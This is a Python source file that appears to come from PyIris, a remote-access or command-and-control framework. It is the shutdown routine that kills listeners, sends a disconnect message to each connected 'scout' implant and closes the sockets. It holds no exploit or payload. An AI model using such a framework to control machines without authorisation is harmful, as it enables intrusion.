# CUI
# done
import os
import time
import socket
import threading
import pyiris_api.library.modules.send_all as send_all
import pyiris_api.library.modules.recv_all as recv_all


def main(self):
    try:
        self.log.blank("\n")
        self.log.inf('User requested shutdown...')
        if self.config.listener_database:
            self.log.lod('Killing all active listeners')
            self.log.inf('Sent kill message to all listeners...')
            self.log.inf('Waiting for response...')
            self.config.listener_database = {}
            while threading.active_count() > 1:
                continue
            self.log.pos('Done')
        if self.config.scout_database:
            self.log.lod('Disconnecting all scouts')
            for i in self.config.scout_database:
                try:
                    send_all.main(self.config.scout_database[i]["conn_object"], 'disconnect')
                    self.config.scout_database[i]["conn_object"].settimeout(5)
                    buffer_out_reply = recv_all.main(self.config.scout_database[i]["conn_object"])
                    self.config.scout_database[i]["conn_object"].close()
                    self.log.pos('Closed connection to scout of ID : ' + i)
                except (socket.error, socket.timeout):
                    self.log.err('Could not close connection to scout of ID : ' + i)
            self.log.pos('Done')
        self.log.pos('Exiting...')
        os._exit(1)
    except EOFError:
        try:
            time.sleep(2)
            quit()
        except KeyboardInterrupt:
            quit()
    except KeyboardInterrupt:
        quit()
